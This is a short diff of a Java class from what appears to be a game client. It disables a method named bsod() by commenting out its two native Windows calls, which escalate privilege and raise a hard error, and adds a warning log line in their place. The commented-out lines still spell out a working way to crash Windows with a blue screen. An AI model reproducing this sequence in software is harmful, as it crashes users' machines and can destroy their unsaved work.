@@ -1,6 +1,7 @@
 package com.syuto.bytes.utils.impl.client;
 
 import com.sun.jna.Native;
+import com.syuto.bytes.Byte;
 
 import java.nio.ByteBuffer;
 
@@ -13,10 +14,11 @@ public class WinUtil {
     public static native int NtRaiseHardError(int ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, ByteBuffer Parameters, int ValidResponseOption, long out_Response);
 
     public static void bsod() {
-        long t1_ptr = ReflectionUtil.theUnsafe.allocateMemory(1);
-        long t2_ptr = ReflectionUtil.theUnsafe.allocateMemory(1);
+        Byte.LOGGER.warn("This would of blue screened your computer but it's been turned off!");
+        //long t1_ptr = ReflectionUtil.theUnsafe.allocateMemory(1);
+        //long t2_ptr = ReflectionUtil.theUnsafe.allocateMemory(1);
 
-        RtlAdjustPrivilege(19, true, false, t1_ptr);
-        NtRaiseHardError(0xc0000022, 0, 0, null, 6, t2_ptr);
+        //RtlAdjustPrivilege(19, true, false, t1_ptr);
+        //NtRaiseHardError(0xc0000022, 0, 0, null, 6, t2_ptr);
     }
 }
